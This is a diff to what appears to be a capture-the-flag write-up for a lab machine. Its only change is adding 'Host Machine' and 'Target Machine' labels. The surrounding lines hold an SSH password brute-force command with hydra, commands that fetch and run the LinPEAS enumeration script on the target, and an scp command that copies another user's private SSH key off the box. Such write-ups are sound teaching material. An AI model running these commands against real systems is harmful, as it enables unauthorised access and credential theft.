@@ -74,18 +74,20 @@ hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.19.208
 
 **TOOLS**: LinPeas, JohnTheRipper
 
-
+Host Machine
 ```
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   scp linpeas.sh jan@10.10.19.208:/dev/shm
 ```
 
+Target Machine
 ```
 cd /dev/shm
 chmod +x linpeas.sh
 ./linpeas.sh | tee linpeas.txt
 ```
 
+Host Machine
 ```
 scp jan@10.10.19.208:/dev/shm/linpeas.txt linpeas.txt
 scp jan@10.10.19.208:/home/kay/.ssh/id_rsa kay_id_rsa
